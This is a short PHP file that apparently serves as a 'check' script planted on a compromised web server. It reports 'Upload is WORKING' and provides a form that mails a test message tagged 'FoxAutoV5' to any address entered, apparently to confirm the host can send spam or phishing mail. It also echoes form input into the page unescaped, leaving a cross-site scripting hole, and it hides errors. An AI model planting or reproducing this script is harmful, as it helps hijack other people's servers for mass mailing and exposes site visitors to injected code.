 
<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" placeholder="E-Mail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order ID" name="orderid" value="<?php print $_POST['orderid']?>" ><br>
<input type="submit" value="Send test >>">
</form>
<br>
<?php

if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderid'];
	}
	else{
		$xx = rand();
	
	}
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING ! FoxAutoV5");
	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
}

?>
